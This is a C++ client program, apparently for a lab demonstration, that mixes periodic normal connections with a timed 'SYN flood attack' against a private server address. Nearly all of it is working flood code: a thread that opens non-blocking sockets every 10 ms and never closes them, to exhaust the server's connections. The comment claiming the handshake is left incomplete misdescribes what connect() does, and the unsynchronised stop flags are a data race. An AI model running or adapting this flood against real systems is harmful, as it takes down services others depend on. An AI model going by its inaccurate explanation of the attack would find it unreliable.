// client.cpp
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/tcp.h>
#include <fcntl.h>

using namespace std;

const char* SERVER_IP = "192.168.64.3";
const int SERVER_PORT = 8080;

// Function for legitimate connection
void legitimate_traffic(bool& stop_flag) {
    while (!stop_flag) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            cerr << "Socket creation failed" << endl;
            continue;
        }

        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            cerr << "Legitimate connection failed" << endl;
        } else {
            cout << "Legitimate connection established" << endl;
            this_thread::sleep_for(chrono::seconds(1)); // Simulate some work
        }
        close(sock);
        this_thread::sleep_for(chrono::milliseconds(500)); // Control rate
    }
}

// Function for SYN flood attack
void syn_flood(bool& stop_flag) {
    while (!stop_flag) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            cerr << "Flood socket creation failed" << endl;
            continue;
        }

        // Set socket to non-blocking to handle many connections
        fcntl(sock, F_SETFL, O_NONBLOCK);

        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        // Attempt connection (SYN packet sent, but we don't complete handshake)
        connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
        
        // Don't close immediately to keep half-open connections
        this_thread::sleep_for(chrono::milliseconds(10)); // Rapid fire
    }
}

int main() {
    bool stop_legitimate = false;
    bool stop_flood = false;

    cout << "t=0s: Starting legitimate traffic" << endl;
    thread legitimate_thread(legitimate_traffic, ref(stop_legitimate));

    this_thread::sleep_for(chrono::seconds(20));
    cout << "t=20s: Starting SYN flood attack" << endl;
    thread flood_thread(syn_flood, ref(stop_flood));

    this_thread::sleep_for(chrono::seconds(80)); // 20s + 80s = 100s
    cout << "t=100s: Stopping SYN flood attack" << endl;
    stop_flood = true;
    flood_thread.join();

    this_thread::sleep_for(chrono::seconds(40)); // 100s + 40s = 140s
    cout << "t=140s: Stopping legitimate traffic" << endl;
    stop_legitimate = true;
    legitimate_thread.join();

    cout << "Demonstration complete" << endl;
    return 0;
}